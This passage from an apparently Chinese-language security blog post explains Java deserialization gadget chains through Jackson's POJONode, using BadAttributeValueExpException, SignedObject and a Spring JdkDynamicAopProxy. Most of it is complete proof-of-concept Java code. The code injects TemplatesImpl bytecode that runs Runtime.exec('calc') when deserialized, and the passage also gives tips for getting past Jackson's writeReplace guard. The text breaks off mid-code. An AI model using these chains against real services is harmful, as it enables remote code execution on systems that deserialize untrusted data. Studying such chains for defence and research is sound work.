<li>jackson的版本之前的好像不行,这里用的2.13.4,也可以开个springboot环境,它会自带jackson<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>BaseJsonNode有个writeReplace方法,它会在序列化的时候抛出一个NodeSerialization的错误,阻止我们构造payload,需要通过反射覆盖掉它或者删掉它<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240430232311.png" alt="image.png"></p>
</li>
<li><p>IDEA调试的时候走一步就弹出一个计算器,我们需要关掉调试的toString()视图<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240510153700.png" alt="image.png"><br>箭头指向的位置不要勾选</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">jsonNode</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> jsonNode.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">            jsonNode.removeMethod(writeReplace);</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,ctClass);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;fakes0u1&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templatesImpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line">        FileOutputStream fout=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        fout.write(barr.toByteArray());</span><br><span class="line">        fout.close();</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="SignObject链"><a href="#SignObject链" class="headerlink" title="SignObject链"></a>SignObject链</h4><p>在Templates被ban的情况下 打二次反序列化</p>
<p>和第一个调用过程一样,这里SignedObject的getObject方法可以进行二次反序列化<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240430235128.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">jsonNode</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> jsonNode.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">            jsonNode.removeMethod(writeReplace);</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,ctClass);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;fakes0u1&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templatesImpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val2.set(exp2,jsonNodes2);</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(exp2,privateKey,signingEngine);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line">        FileOutputStream fout=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        fout.write(barr.toByteArray());</span><br><span class="line">        fout.close();</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line">        <span class="comment">//doPOST(exp.toString().getBytes());</span></span><br><span class="line">        <span class="comment">//byte[] byt=new byte[fileInputStream.available()];</span></span><br><span class="line">        <span class="comment">//fileInputStream.read(byt);</span></span><br><span class="line">        <span class="comment">//doPOST(byt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        <span class="comment">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span></span><br><span class="line">        <span class="comment">//writeReplaceMethod.setAccessible(true);</span></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="处理JACKSON链的不稳定性"><a href="#处理JACKSON链的不稳定性" class="headerlink" title="处理JACKSON链的不稳定性"></a>处理JACKSON链的不稳定性</h2><p>我们在<code>BeanSerializerBase.serializeFields()</code>方法下断点<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240501001523.png" alt="image.png"></p>
<p>这里循环遍历之前获取的props,依次调用它的getter方法,从图可以看出此时getOutputProperties是第一个,没问题,但是有些时候它可能不是第一个被调用的被排在了后面,就会提前报错,无法执行后面的恶意方法</p>
<p>这里的思路来源于ysoserial的JSON1链<br>有一个<code>JdkDynamicAopProxy</code>类,我们通过观察它invoke方法可以发现<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240510151225.png" alt="image.png"></p>
<p>这个内置变量<code>advised</code>,它是<code>org.springframework.aop.framework.AdvisedSupport</code>类型的,它的targetSource是被代理的接口的实例类,我们需要代理的接口方法是<code>Templates</code>接口的<code>getOutputProperties</code>方法,它也只有这一个get方法,实例类可以设置成恶意的<code>TemplatesImpl</code>类,它的<code>getOutputProperties</code>方法是漏洞点</p>
<p>然后就是这个操作需要 Spring AOP依赖,如果我们是Springboot环境下的话就不要操心,默认自带</p>
<p>当走到<code>BeanPropertyWriter.serializeAsField</code>方法时,我们可以发现成功代理恶意TemplatesImpl类的getOutputProperties方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240510152529.png" alt="image.png"><br>当调用这个方法时,会进入到Method.invoke()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240510152646.png" alt="image.png"><br>一步步反射到JdkDynamicAopProxy的invoke()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240510153032.png" alt="image.png"><br>在 <code>AopUtils.invokeJoinpointUsingReflection</code>进一步调用<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240510153117.png" alt="image.png"><br>先设置accessible,然后调用恶意函数,进入到<code>TemplatesImpl.getOutputProperties</code>方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240510153227.png" alt="image.png"></p>
<p>后面就是加载字节码了</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">json1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">jsonNode</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> jsonNode.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">            jsonNode.removeMethod(writeReplace);</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,ctClass);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;fakes0u1&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        AdvisedSupport advisedSupport=<span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(templatesImpl);</span><br><span class="line">        Constructor constructor1=Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler=(InvocationHandler) constructor1.newInstance(advisedSupport);</span><br><span class="line">        Object proxy= Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Templates.class&#125;,handler);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxy);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line">        